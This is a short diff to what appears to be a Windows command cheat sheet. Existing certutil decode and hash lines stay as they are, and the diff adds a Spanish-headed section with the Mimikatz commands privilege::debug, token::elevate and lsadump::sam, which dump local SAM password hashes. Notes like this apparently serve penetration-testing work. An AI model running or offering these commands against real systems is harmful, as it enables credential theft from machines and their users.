@@ -10,3 +10,9 @@ certutil -decode encoded.txt decoded.txt
 certutil -hashfile ".\file.txt" md5
 certutil -hashfile ".\file.txt" sha1
 certutil -hashfile ".\file.txt" sha256
+
+#####################################################
+DUMPEO DE HASHES CON MIMIKATZ
+privilege::debug
+token::elevate
+lsadump::sam
